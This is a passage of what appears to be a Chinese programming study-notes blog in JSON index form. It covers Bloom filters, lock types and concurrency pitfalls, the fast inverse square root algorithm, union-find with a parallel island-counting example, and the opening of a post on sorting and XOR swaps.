0; i &lt; len; i++) &#123;            result = seed * result + value.charAt(i);        &#125;        return (size - 1) &amp; result;    &#125;&#125;\n\n测试：\nimport BloomFilter.BloomFilter;import org.junit.Test;public class BloomFilterTest &#123;    @Test    public void bloomFilter() &#123;        BloomFilter bloomFilter = new BloomFilter();        for (int i = 0; i &lt; 100000; i++) &#123;            bloomFilter.add(String.valueOf(i));        &#125;        System.out.println(bloomFilter.contains(&quot;1&quot;));        System.out.println(bloomFilter.contains(&quot;2&quot;));        System.out.println(bloomFilter.contains(&quot;3&quot;));        System.out.println(bloomFilter.contains(&quot;100001&quot;));    &#125;&#125;\n\n运行结果：\ntruetruetruefalse\n\nGuava 中的 BloomFilter依赖：\n&lt;dependency&gt;    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;    &lt;artifactId&gt;guava&lt;/artifactId&gt;    &lt;version&gt;31.0.1-jre&lt;/version&gt;&lt;/dependency&gt;\n\n使用：\n@Testpublic void test() &#123;    BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), 100000, 0.0001);    for (int i = 0; i &lt; 100000; i++) &#123;        bloomFilter.put(i);    &#125;    System.out.println(bloomFilter.mightContain(1));    System.out.println(bloomFilter.mightContain(2));    System.out.println(bloomFilter.mightContain(3));    System.out.println(bloomFilter.mightContain(100001));&#125;\n\n运行结果：\ntruetruetruefalse\n\n总结关于哈希函数有空再仔细研究研究（咕咕咕）\n参考文章：布隆过滤器(Bloom Filter)详解十分钟理解布隆过滤器布隆过滤器，这一篇给你讲的明明白白布隆过滤器概念及其公式推导 转载\n","categories":["学习笔记"],"tags":["数据结构","哈希","过滤"]},{"title":"常用的锁","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B8%B8%E7%94%A8%E7%9A%84%E9%94%81/","content":"在并发编程中，锁是用于同步线程、避免数据竞争和确保线程安全的重要机制。\n互斥锁（Mutex）互斥锁是最基本的锁类型，确保同一时间只有一个线程可以访问共享资源。\n\n线程获取锁后，其他尝试获取锁的线程会被阻塞，直到锁被释放。\n通常用于保护临界区（Critical Section）。\n实现简单，但可能导致线程阻塞和上下文切换开销。\n\n\n用于需要确保独占访问共享资源的场景。\n\n读写锁（Read-Write Lock）允许多个线程同时读取共享资源，但写操作需独占访问。\n\n读锁：多个线程可同时持有读锁（共享锁）。\n写锁：写锁是独占的，写时不允许其他读或写操作。\n提高并发性能，尤其在读多写少的场景。\n\n是互斥锁的一种扩展，区分读写操作以提升性能。\n\n用于读操作频繁、写操作较少的场景，如数据库缓存。\n\n条件锁（Condition Lock）结合条件变量，用于线程间的协作，线程在特定条件满足时才继续执行。\n\n通常与互斥锁配合使用，线程等待条件满足时进入休眠，条件满足时被唤醒。\n提高效率，避免忙等待。\n\n条件锁依赖互斥锁，互斥锁保护共享条件变量。\n\n用于生产者-消费者模型、线程同步等待。\n\n信号量（Semaphore）一种计数器机制，控制多个线程对有限资源的访问。\n\n允许指定数量的线程同时访问资源（计数&gt;1）。\n当计数为1时，行为类似于互斥锁。\n\n信号量是互斥锁的泛化，支持多线程并发访问。互斥锁限制为单一线程访问。\n\n用于限制并发访问数量，如连接池管理。\n\n分布式锁在分布式系统中，用于协调多个进程或节点对共享资源的访问。\n\n跨机器实现，通常基于外部存储（如Redis、ZooKeeper、Etcd）。\n需考虑网络延迟、节点故障等复杂情况。\n\n分布式锁是互斥锁的分布式扩展，适用于跨进程或跨机器场景。本地锁（如Mutex）仅限于单机多线程。\n\n用于分布式系统中协调跨进程或跨节点的资源访问，如分布式任务调度。\n\n悲观锁和乐观锁（加锁策略）悲观锁（Pessimistic Lock）悲观锁假设并发操作中冲突（数据竞争）发生的概率较高，因此在访问共享资源之前，总是先获取锁，确保独占访问。其他线程在锁被释放前会被阻塞。\n\n适用于写操作频繁、冲突概率高、数据一致性要求严格的场景。如互斥锁、读写锁、数据库锁（行锁、表锁）。\n\n乐观锁（Optimistic Lock）乐观锁假设并发操作中冲突发生的概率较低，允许线程先执行操作，在提交时检查数据是否被修改。如果未被修改，则提交成功；否则，回滚并重试。乐观锁通常不使用传统锁机制，而是依赖版本控制或原子操作。\n乐观锁是非阻塞的，线程直接操作共享资源，而无需等待锁。通过版本号、时间戳或CAS（Compare-And-Swap）检查数据是否被修改。\n\n适用于读多场景，高并发低冲突。如缓存更新、计数器\n\n阻塞锁和非阻塞锁（等待机制）阻塞锁（Blocking Lock）阻塞锁是指当线程尝试获取锁时，如果锁已被其他线程占用，当前线程会进入阻塞状态（挂起），等待锁释放。阻塞状态通常由操作系统管理，线程被放入等待队列，暂停执行，直到被唤醒。\n锁不可用时，线程被挂起，释放CPU资源。但通常涉及线程的上下文切换（从用户态到内核态），开销较高。线程唤醒和重新调度可能引入延迟。\n\n适用于需要强一致性、长时间持有锁或高冲突场景。互斥锁、读写锁、条件锁都属于阻塞锁。\n\n非阻塞锁（Non-Blocking Lock）非阻塞锁是指当线程尝试获取锁时，如果锁不可用，线程不会进入阻塞状态，而是立即返回（失败）或通过忙等待（busy-waiting）继续尝试。非阻塞锁通常基于原子操作实现，尽量避免操作系统介入。\n锁不可用时，线程要么立即返回，要么短暂自旋（循环尝试）。基于原子操作（如CAS、Test-and-Set），通常在用户态完成。自旋可能浪费CPU资源，但避免上下文切换。\n\n适用于需要高吞吐量、短锁持有时间、冲突概率较低的场景。自旋锁、乐观锁属于非阻塞锁。TryLock机制用于快速失败（尝试获取锁，失败则立即返回）。\n\n可重入锁和非可重入锁（重入性）基于锁是否允许同一线程多次获取的特性进行分类。它们在实现线程安全和避免死锁方面有显著差异。\n可重入锁（Reentrant Lock）可重入锁允许同一线程多次获取同一把锁而不会导致死锁。每次获取锁时，锁内部会记录重入次数，线程必须释放相同次数的锁才能完全解锁。\n同一线程可多次调用Lock()，每次增加锁的计数器。释放时需调用Unlock()与Lock()次数相同，计数器减为0时锁被释放。\n\n适用于复杂逻辑中，同一线程多次进入临界区（递归函数或嵌套调用）的场景。\n\n非可重入锁（Non-Reentrant Lock）非可重入锁不允许同一线程多次获取同一把锁。如果线程尝试重复加锁，会导致死锁或异常。\n\n适用于简单互斥场景。\n\n公平锁和非公平锁（分配策略）根据锁的分配策略分类。区别在于当多个线程（或goroutine）竞争锁时，锁是否按照线程请求的顺序（通常是先到先得）分配。\n公平锁（Fair Lock）公平锁确保线程按照请求锁的顺序获取锁，通常采用先到先得（FIFO，First-In-First-Out）策略。当锁释放时，等待队列中最先请求的线程优先获得锁。\n线程按请求顺序获取锁，避免线程饥饿（某些线程长期无法获取锁）。维护了一个队列，用于记录线程的请求顺序。在锁被释放时，唤醒队列头部的线程。\n\n适用于需要严格公平性、避免线程饥饿的场景。需要维护队列，性能相对较低。\n\n非公平锁（Non-Fair Lock）非公平锁不保证线程按请求顺序获取锁。当锁释放时，等待线程和新请求线程竞争锁，操作系统或运行时决定哪个线程获得锁，可能导致后请求的线程优先获取。\n不保证FIFO，可能导致线程饥饿（某些线程长期无法获取锁）。\n\n适用于追求高性能、允许一定程度不公平的场景。\n\n锁会引发的问题死锁（deadlock）多个线程互相持有对方需要的锁，导致所有线程无法继续执行。\n死锁产生的四个必要条件（梦回操作系统课）：\n\n互斥条件：一个资源每次只能被一个进程使用。\n请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。\n不剥夺条件：进程已获得的资源，在没使用完之前，不能强行剥夺。\n循环等待条件：多个进程之间形成一种互相循环等待资源的关系。\n\n发生场景：\n\n多个锁的嵌套获取，且顺序不一致。\n非可重入锁（如sync.Mutex）在同一线程重复加锁。\n\n解决方法（破坏四个必要条件）：\n\n统一线程的请求锁的顺序，以保证线程能获取到所需的全部资源而不阻塞，进而保证不发生死锁。\n避免线程持有锁并等待锁。在请求锁时，如果锁被其他线程占用，不等待，而是将之前持有的锁释放，保证其他线程顺利执行。\n\n活锁（Livelock）线程不断尝试获取锁但无法成功，处于活跃但无进展的状态。活锁其实是避免死锁的一种方式——避免线程持续尝试获取锁，而是通过等待或随机退避来避免。\n举个例子：在一个比较窄但允许两人同行的马路上，两个人相对而行，如果两个人相撞死锁是：两个人僵持不动，谁都无法往前走活锁是：两个人都很客气的让路给对方，但是两人同时移动到另一侧，又继续相撞，再移动回来又相撞，一直这样持续下去，那么就会发生活锁\n活锁发生的概率是非常非常低的，两人的移动必须一直保持完全同步才可以，不然很快就可以解锁\n发生场景：\n\n非阻塞锁（如自旋锁）在高竞争下持续重试。\n两个线程互相礼让锁（如CAS失败后退避）。\n\n解决方法：\n\n引入随机退避（如指数退避）。\n限制重试次数，切换到阻塞锁。\n\n线程饥饿（Starvation）死锁或活锁描述的是多个线程的整体状态，线程饥饿描述的是单个线程的状态。饥饿是某些线程长期无法获取锁，导致无法执行。\n发生场景：\n\n非公平锁（如sync.Mutex）优先新请求线程。\n高优先级线程抢占锁。\n\n解决方法：\n\n使用公平锁。\n调整线程优先级或调度策略。\n\n优先级反转（Priority Inversion）高优先级线程因等待低优先级线程释放共享资源（如锁）而被阻塞，而低优先级线程可能被其他中优先级线程抢占，导致高优先级线程的执行延迟。这种现象违背了优先级调度原则，可能导致实时系统无法满足时间要求。\n发生场景：\n\n实时系统中，低优先级线程持有锁，高优先级线程被阻塞。\n\n解决方法：\n\n优先级继承（低优先级线程临时提升优先级，确保低优先级的线程优先于中优先级线程运行，尽快释放锁。）\n优先级提升（为每个锁设置最高优先级，持有锁的线程提升到该优先级）\n\n伪唤醒（Spurious Wakeup）伪唤醒是指线程在等待条件变量（如条件锁）时，被操作系统或运行时无故唤醒，而条件并未满足。\n伪唤醒是操作系统或并发库实现条件变量时的一种副作用，其原因主要与底层实现和优化相关。操作系统可能设计为允许伪唤醒，在Signal()或Broadcast()时唤醒多个等待线程，而不是精确唤醒一个。以提高效率或简化同步原语的实现，防止复杂场景下的死锁或错误。伪唤醒是条件变量实现的“不可避免副作用”，标准（如POSIX、C++）明确允许其存在。设计上，条件变量不保证“仅当条件满足时唤醒”，因此在使用条件锁时需要额外的处理。\n解决方法：\n\n使用循环检查条件\n\n由单次检查条件改为循环检查条件：\nmu.Lock()if !condition() &#123;    cond.Wait()&#125;mu.Unlock()\n\nmu.Lock()for !condition() &#123;    cond.Wait()&#125;mu.Unlock()\n\nABA问题ABA问题是指在并发环境中，线程读取共享变量的值为A，准备通过CAS更新时，变量可能被其他线程修改为B后再改回A。由于CAS只检查值是否为A，线程误认为变量未被修改，执行更新操作，导致逻辑错误。\n\n可能导致数据不一致（如无锁栈中重复使用已释放的内存）。\n破坏程序逻辑，尤其在涉及指针或资源管理的场景。\n\n任何基于CAS操作的并发控制机制，比如非阻塞锁（自旋锁、乐观锁）、无锁数据结构等，都会引发ABA问题。涉及内存重用（如指针回收后重新分配相同地址）也会引发。\nABA问题的核心是CAS无法区分“值未变”和“值变回原值”。\n解决方法：\n\n版本号&#x2F;时间戳：CAS检查值和版本，两次CAS，分别比较。\n双字CAS（Compare-And-Swap-Double），同时比较两个值（如值和版本号）：单次CAS，需要硬件支持DCAS。\n垃圾回收：垃圾回收可以避免指针立即重用，降低ABA问题风险。\nTagged Pointers：在指针中嵌入版本信息，CAS操作检查整个指针（值+版本），避免ABA问题，复杂实现。\n避免指针重用：使用新分配内存或对象池，避免值恢复原状。\n阻塞锁：如sync.Mutex，完全避免ABA。\n\n","categories":["学习笔记"],"tags":["并发","锁"]},{"title":"平方根倒数快速算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B9%B3%E6%96%B9%E6%A0%B9%E5%80%92%E6%95%B0%E5%BF%AB%E9%80%9F%E7%AE%97%E6%B3%95/","content":"介绍来看段代码，由 格雷格·沃什 所写。注释由 卡马克 所写。用于快速求平方根倒数。常用于在3D图形编程。随《雷神之锤3》代码开源以及卡马克注释中优雅的评价而出名。\nfloat Q_rsqrt(float number)&#123;    long i;    float x2, y;    const float threehalfs = 1.5F;        x2 = number * 0.5F;    y = number;    i = * ( 1ong * ) &amp;y; // evil floating point bit level hacking    i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?    y = * ( float * ) &amp;i;    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2st iteration this can be removed    return y;&#125;\n\n如何求平方根比如求 2 的平方根，要精确到 7 位小数。把问题转化下，其实是求 y&#x3D;x^2-2 这个函数与 x 轴的交点。由于这个函数是条曲线，交点坐标不好求。那么可以用一条直线近似代替曲线，什么样的直线可以呢？是 切线取 x&#x3D;2 处的切线（y&#x3D;4x-6），近似代替曲线。如图：\n\n近似替代后，得到交点坐标为 (1.5,0) 那么 根号2 的一个近似值就是 1.5。那么这个精度还是不够的。\n如何解决呢？答案是取这个点处的切线（y&#x3D;3x-4.25）继续近似替代。如图：\n\n此时，近似值来到了 1.4166666666666667在多次这样的操作之后，近似值的精度会越来越高。第三次近似值：1.4142156862745099第四次近似值：1.4142135623746899第五次近似值：1.4142135623730951大概第四次第五次就达到想要的精度了。\n这个方法就是 牛顿法，被广泛用于近似求解各种方程。牛顿法的公式可以简化：\n\n手算这么多位的小数肯定会头皮发麻，但计算机不会。而且牛顿法每步迭代公式都一样，给计算机算太合适了。\nfunc Q_rsqrt() &#123;\t// 初始值\tx := 2.0\tprecision := 1e-7 // 预定精度\t// 牛顿法迭代函数\tfx := func(x float64) float64 &#123;\t\treturn x*x - 2\t&#125;\t// 牛顿法迭代公式（导函数）\tdfx := func(x float64) float64 &#123;\t\treturn 2 * x\t&#125;\t// 迭代牛顿法求解根号2\tfor &#123;\t\txNext := x - fx(x)/dfx(x)\t\tif math.Abs(x-xNext) &lt; precision &#123;\t\t\tbreak\t\t&#125;\t\tx = xNext\t&#125;\t// 输出结果\tfmt.Printf(&quot;根号2的近似解:%.7f\\n&quot;, x)&#125;\n\n如何优化上面通过牛顿法虽然可以求出平方根的近似值，但是效率很低。要经过多次迭代。那么有办法减少迭代次数吗？或者只用一次牛顿法得到足够精确的值吗？通过观察牛顿法的公式可以发现，减少迭代次数的关键就是初始值的选择。\n上面的例子中，初始值为 2，迭代了 4 次得到精度为 7 位小数的结果。但如果初始值选择为 1.414，那么只需要一次牛顿法就可以得到想要的结果。\n那么如何得到更加精确的初始值呢？要得到的不就是“更加精确的初始值”吗？\n如何得到更加精确的初始值首先，了解下计算机是如何存储浮点数的。学习过计算机组成原理的应该都知道，IEEE754。全称：IEEE二进制浮点数算术标准（ANSI&#x2F;IEEE Std 754-1985）\n32位单精度浮点数存储方法：\n\n1为符号位 8位指数位 23位尾数位\n64位双精度浮点数存储方法也类似：1为符号位 11位指数位 52位尾数位\n这里拿32位举例。（当初学计组，拿笔手算浮点数运算可痛苦了下图是32位浮点数十进制值与二进制值的关系：\n\n那么知道浮点数在计算机底层中是如何存储的之后，就要对上面的公式进行简化。\n这里要运用对数的知识。对数可以将乘除运算变为加减运算，将幂运算变为乘法运算。如图：\n\n我们要求的是平方根的倒数，也就是求 a的对数乘以-1&#x2F;2 ：\n\n那么对数怎么求？这里要分两部分。将浮点数转十进制的公式带入对数将幂运算转换为乘法运算的公式中。然后将式子展开（乘法运算转为加减运算）前面还是对数的形式，后面则可以直接得到结果。\n\n那前面的部分如何处理？M 是一个23位的2进制尾数，它除以 2^23 一定在 0~1 之间。\n我们可以观察下 y&#x3D;以2为底的log(1+x) 与 y&#x3D;x 在 0~1之间的函数图像。如图： \n\n这里借鉴了牛顿的思维，用直线近似替代曲线。因为 0~1 之间，y&#x3D;x 与 y&#x3D;log(1+x) 十分接近，所以用 y&#x3D;x 近似替代 y&#x3D;log(1+x)。这就是上式约等号的由来。\n将 2^23分之一 提取出来，得到：\n\n括号里的东西，不正是计算机中二进制存储的值吗？所以，浮点数y 与 二进制存储的Y 关系：\n\n那么，假设 a 为 y 的平方根倒数：\n\n将 a 和 y 换成二进制形式：\n\n化简得到：\n\n381*2^22 用16进制表示：5f400000\n于是出现了让卡马克写下 what the fuck? 注释的语句。但是在沃什的代码中，这个数字是 5f3759df为什么呢？因为刚才用 y&#x3D;x 近似替代 y&#x3D;log(1+x) 时，有些粗糙了。用 y&#x3D;x 近似替代，只有在两端的误差比较小。中间误差就大了。而如果将 y&#x3D;x 往上移一些，就可以使误差在两端和中间比较平均，整体误差更小。\n反应到程序中，就是给 5f400000 加上一个偏移量。沃什选择了 5f3759df，使用这个值，即使不用牛顿法，平方根倒数的最大误差也只有 5%，将初始值带入，算出的误差不超过2‰。\n到这，我们终于得到了精确的初始值。即代码中的 y。\n代码最重要的四行，也就是注释开始的后四行。第一行，将32位浮点数转为长整型，用于二进制计算第二行，得到初始值（算法最核心的地方）第三行，将长整型转回32位浮点数第四行，使用牛顿法迭代一次（注释了一行，是因为迭代一次的精度就已经足够。大佬恐怖如斯）\n再次欣赏一下：\nfloat Q_rsqrt(float number)&#123;    long i;    float x2, y;    const float threehalfs = 1.5F;        x2 = number * 0.5F;    y = number;    i = * ( 1ong * ) &amp;y; // evil floating point bit level hacking    i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?    y = * ( float * ) &amp;i;    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2st iteration this can be removed    return y;&#125;\n\n上面公式太乱没有看懂的话，下面是手写过程：\n\ngo语言实现：\nfunc Q_rsqrt(number float32) float32 &#123;\ti := uint32(0)\tx2 := number * 0.5\ty := number\tthreehalfs := float32(1.5)\ti = *(*uint32)(unsafe.Pointer(&amp;y))\ti = 0x5f3759df - (i &gt;&gt; 1)\ty = *(*float32)(unsafe.Pointer(&amp;i))\ty = y * (threehalfs - (x2 * y * y))\treturn y&#125;\n\n总结这个算法牛就牛在运用了浮点数在计算机中的存储方法。还有至今不知道怎么来的”魔法数字“ 5f3759df\n参考：什么代码让程序员之神感叹“卧槽”？ - bilibili 量子位\n","categories":["学习笔记"],"tags":["算法"]},{"title":"并查集","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/","content":"介绍并查集是一种树型的数据结构，用于处理一些不相交集合（disjoint sets）的合并及查询问题。常常在使用中以森林来表示。哈希表查询很快，但在合并上效率不高。链表合并很快，但查询效率不高。并查集在合并和查询上都接近 O(1)\n两个主要操作：合并（union）：将两个集合合并为一个集合。查询（find）：确定元素属于哪个集合。 并查集中不断往上寻找他的代表元素，用于确定两个元素是否属于同一集合。\n原理并查集是将集合以树形结构进行组合的数据结构，每个元素（节点）都保存着到它代表元素（父节点）的引用。合并：将两个集合合并，即将一颗树的根连接到另一棵树的根。查找：根据代表元素找到最顶层的代表元素，相同则在同一集合，否则不在。\n这是并查集最基本的表示方式，但它并不是很高效。因为合并操作过多时，树的深度会加大，可能会导致创建的树严重不平衡。（查询效率会降低）\n优化一：按秩合并按秩（树的深度）合并，即总是将元素少的树连接至元素多的树上。因为影响运行时间的是树的深度，更小的树添加到更深的树的根上将不会增加秩，除非它们的秩相同。\n优化二：路径压缩路径压缩，即在查找代表元素时，将树扁平化（降低深度）。具体操作是将路径上每个元素的代表元素置为最顶层的代表元素（根）。这样树的深度会降低，根节点下只有一层叶子节点。\n关于并查集的复杂度（略）能力不够，证明不出来。只找到了一篇文章：借这个问题科普一下并查集各种情况下的时间复杂度并查集并查集复杂度\n总之，时间复杂度是很低的，接近O(1)。\n实现（coding）package UnionFind;import java.util.HashMap;import java.util.List;import java.util.Stack;public class UnionFind &#123;    // 对样本进行包裹（元素）    public static class Element&lt;V&gt; &#123;        public V value;        public Element(V value) &#123;            this.value = value;        &#125;    &#125;    public static class UnionFindSet&lt;V&gt; &#123;        // 样本与元素的对应        public HashMap&lt;V, Element&lt;V&gt;&gt; elementMap;        // key 某个元素 value 元素的父        public HashMap&lt;Element&lt;V&gt;, Element&lt;V&gt;&gt; fatherMap;        // key 某个集合的代表元素 value 集合的大小        public HashMap&lt;Element&lt;V&gt;, Integer&gt; sizeMap;        /**         * 初始化并查集         *         * @param list         */        public UnionFindSet(List&lt;V&gt; list) &#123;            elementMap = new HashMap&lt;&gt;();            fatherMap = new HashMap&lt;&gt;();            sizeMap = new HashMap&lt;&gt;();            // 初始化            for (V value : list) &#123;                // 进行包裹                Element&lt;V&gt; element = new Element&lt;V&gt;(value);                // 样本与元素一一对应                elementMap.put(value, element);                // 父节点（代表元素）都是自己                fatherMap.put(element, element);                // 集合大小都为1（只有本身）                sizeMap.put(element, 1);            &#125;        &#125;        /**         * 查找元素的代表元素         */        private Element&lt;V&gt; findHead(Element&lt;V&gt; element) &#123;            // 代表元素不是本身时，放入栈中，且一直往上找            Stack&lt;Element&lt;V&gt;&gt; path = new Stack&lt;&gt;();            while (element != fatherMap.get(element)) &#123;                path.push(element);                element = fatherMap.get(element);            &#125;            // 找到代表元素后，将栈中所有子节点的代表元素置为最顶层代表元素            while (!path.isEmpty()) &#123;                fatherMap.put(path.pop(), element);            &#125;            return element;        &#125;        /**         * 判断两样本是否在同一集合         */        public boolean isSameSet(V a, V b) &#123;            // 并查集中是否有该元素（是否初始化）            if (elementMap.containsKey(a) &amp;&amp; elementMap.containsKey(b)) &#123;                // 代表元素是否相同                return findHead(elementMap.get(a)) == findHead(elementMap.get(b));            &#125;            return false;        &#125;        /**         * 合并集合         */        public void union(V a, V b) &#123;            if (elementMap.containsKey(a) &amp;&amp; elementMap.containsKey(b)) &#123;                // 获取对应元素                Element&lt;V&gt; aFather = findHead(elementMap.get(a));                Element&lt;V&gt; bFather = findHead(elementMap.get(b));                // 不在同一集合时，将节点少的集合添加到节点多的集合中                if (aFather != bFather) &#123;                    Element&lt;V&gt; big = sizeMap.get(aFather) &gt;= sizeMap.get(bFather) ? aFather : bFather;                    Element&lt;V&gt; small = big == aFather ? bFather : aFather;                    fatherMap.put(small, big);                    sizeMap.put(big, sizeMap.get(aFather) + sizeMap.get(bFather));                    sizeMap.remove(small);                &#125;            &#125;        &#125;    &#125;&#125;\n\n应用\n岛问题【题目】一个矩阵中只有0和1两种值，每个位置都可以和自己的上、下、左、右四个位置相连，如果有一片1连在一起，这个部分叫做一个岛，求一个矩阵中有多少个岛？【举例】001010111010100100000000这个矩阵中有三个岛【进阶】如何设计一个并行算法解决这个问题\n\n\n使用递归暴力求解\n将矩阵进行划分，然后每块都使用递归求解，最后进行合并（这里只分成了两块，使用两个线程模拟）\n\n实现：\npackage UnionFind;import java.util.ArrayList;import java.util.List;import java.util.concurrent.CountDownLatch;public class Application &#123;    /**     * 数组封装后的对象     */    private static class Node &#123;        int i;        int j;        int value;        public Node(int i, int j, int value) &#123;            this.i = i;            this.j = j;            this.value = value;        &#125;    &#125;    private static Node[][] nodes;    private static UnionFind.UnionFindSet&lt;Node&gt; unionFindSet;    /**     * 第二种解法     * 也是递归感染，但是是并行的。将矩阵进行划分，然后分别统计，最后将结果合并。     */    public static int countIslandsUnionFind(int[][] m) throws InterruptedException &#123;        if (m == null || m[0] == null) &#123;            return 0;        &#125;        // 获取矩阵大小        int N = m.length;        int M = m[0].length;        // 设置返回值数组，供两个线程使用        final int[] results = &#123;0, 0&#125;;        // 将数组的元素封装成对象，并将岛加入列表，放入并查集        List&lt;Node&gt; list = new ArrayList&lt;&gt;();        nodes = new Node[N][M];        for (int i = 0; i &lt; N; i++) &#123;            for (int j = 0; j &lt; M; j++) &#123;                Node node = new Node(i, j, m[i][j]);                nodes[i][j] = node;                if (m[i][j] == 1) &#123;                    list.add(node);                &#125;            &#125;        &#125;        // 初始化并查集        unionFindSet = new UnionFind.UnionFindSet&lt;Node&gt;(list);        // 开启两个线程，分别统计一半        final CountDownLatch latch = new CountDownLatch(2);        Thread t1 = new Thread(new Runnable() &#123;            @Override            public void run() &#123;                for (int i = 0; i &lt; N; i++) &#123;                    for (int j = 0; j &lt; M / 2; j++) &#123;                        if (nodes[i][j].value == 1) &#123;                            results[0]++;                            infectUnionFind(i, j, 0, N, 0, M / 2);                        &#125;                    &#125;                &#125;                latch.countDown();            &#125;        &#125;);        Thread t2 = new Thread(new Runnable() &#123;            @Override            public void run() &#123;                for (int i = 0; i &lt; N; i++) &#123;                    for (int j = M / 2; j &lt; M; j++) &#123;                        if (nodes[i][j].value == 1) &#123;                            results[1]++;                            infectUnionFind(i, j, 0, N, M / 2, M);                        &#125;                    &#125;                &#125;                latch.countDown();            &#125;        &#125;);        t1.start();        t2.start();        latch.await();        // 合并，判断分界线两侧的元素是否是相连的岛        int result = results[0] + results[1];        for (int i = 0; i &lt; N; i++) &#123;            if (nodes[i][M / 2 - 1].value == nodes[i][M / 2].value &amp;&amp; nodes[i][M / 2 - 1].value == 2 &amp;&amp; !unionFindSet.isSameSet(nodes[i][M / 2 - 1], nodes[i][M / 2])) &#123;                unionFindSet.union(nodes[i][M / 2 - 1], nodes[i][M / 2]);                result--;            &#125;        &#125;        return result;    &#125;    /**     * 感染过程     */    private static boolean infectUnionFind(int i, int j, int N1, int N2, int M1, int M2) &#123;        if (i &lt; N1 || i &gt;= N2 || j &lt; M1 || j &gt;= M2 || nodes[i][j].value != 1) &#123;            return false;        &#125;        // i,j没有越界且当前位置为1        nodes[i][j].value = 2;        // 感染上下左右四个位置        if (infectUnionFind(i + 1, j, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i + 1][j]);        &#125;        if (infectUnionFind(i - 1, j, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i - 1][j]);        &#125;        if (infectUnionFind(i, j + 1, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i][j + 1]);        &#125;        if (infectUnionFind(i, j - 1, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i][j - 1]);        &#125;        return true;    &#125;    /**     * 第一种解法     * 递归感染     * 时间复杂度 O(N*M)     */    public static int countIslands(int[][] m) &#123;        if (m == null || m[0] == null) &#123;            return 0;        &#125;        // 获取矩阵大小        int N = m.length;        int M = m[0].length;        int result = 0;        // 遍历矩阵中每个元素        for (int i = 0; i &lt; N; i++) &#123;            for (int j = 0; j &lt; M; j++) &#123;                // 是岛则进行感染过程                if (m[i][j] == 1) &#123;                    result++;                    infect(m, i, j, N, M);                &#125;            &#125;        &#125;        return result;    &#125;    /**     * 递归传染     */    private static void infect(int[][] m, int i, int j, int N, int M) &#123;        if (i &lt; 0 || i &gt;= N || j &lt; 0 || j &gt;= M || m[i][j] != 1) &#123;            return;        &#125;        // i,j没有越界且当前位置为1        m[i][j] = 2;        // 感染上下左右四个位置        infect(m, i + 1, j, N, M);        infect(m, i - 1, j, N, M);        infect(m, i, j + 1, N, M);        infect(m, i, j - 1, N, M);    &#125;&#125;\n\n测试：\nimport UnionFind.Application;import org.junit.Test;public class UnionFindTest &#123;    @Test    public void countIslandsTest() throws InterruptedException &#123;        int[][] m1 = new int[1000][1000];        int[][] m2 = new int[1000][1000];        for (int i = 0; i &lt; 1000; i++) &#123;            for (int j = 0; j &lt; 1000; j++) &#123;                int temp = (int) (Math.random() * 2);                m1[i][j] = temp;                m2[i][j] = m1[i][j];            &#125;        &#125;        System.out.println(&quot;递归感染过程（单线程）：&quot; + Application.countIslands(m1));        System.out.println(&quot;划分地图，多线程并行：&quot; + Application.countIslandsUnionFind(m2));    &#125;&#125;\n\n运行结果：\n递归感染过程（单线程）：66575划分地图，多线程并行：66575进程已结束,退出代码0\n\n总结最后划分矩阵分别使用递归，最后合并的代码写了好久。对Java常用的数据结构还不是很熟悉，又不想改动已经写好的并查集结构。所以写了Node对象，使用nodes数组对矩阵进行复制。（毕竟要保证并查集中的元素都不一样，虽然值可能一样。而Java中，不new一个Integer对象，而是直接赋值，会自动装箱。自动装箱会将-128~127的数的对象引用指向静态代码块中创建好的对象）另外，要注意边界的条件。coding能力有限，只实现了划分一次。如果是根据矩阵大小动态地划分矩阵，分给多个cpu运算，最后进行合并。会是一个理想的解决方案。这里就不实现了，练习结束！\n\n顺带一提，时间复杂度的证明比较复杂，所以这里只实现用法和了解大概的复杂度，不深究具体的复杂度及其证明。\n\n\n参考文章：并查集基础算法：并查集并查集(通俗易懂)【算法与数据结构】—— 并查集借这个问题科普一下并查集各种情况下的时间复杂度并查集并查集复杂度\n","categories":["学习笔记"],"tags":["数据结构","并查集"]},{"title":"经典排序算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","content":"前言重新开始学算法，虽然已经上过 数据结构与算法 和 算法分析设计 的课程。以后关于算法的代码都会放在算法代码仓库\n交换两变量的值第一种方法也是最常用的，没什么限制。借助一个辅助变量\nprivate static void swap(int[] array, int i, int j) &#123;    int temp = array[i];    array[i] = array[j];    array[j] = temp;&#125;\n\n第二种方法，利用异或运算实现。不借助额外空间\nprivate static void swap_1(int[] array, int i, int j) &#123;    array[i] = array[i] ^ array[j];    array[j] = array[i] ^ array[j];    array[i] = array[i] ^ array[j];&#125;\n\n异或运算 也可以叫做无进位相加（同为0，不同为1）满足交换律和结合律\n\n必须保证交换的变量内存地址不一致，否则两变量都会变为0。\n\n交换的原理：\na=甲^乙               b=乙a=甲^乙               b=甲^乙^乙=甲^0=甲a=甲^乙^甲=乙^0=乙     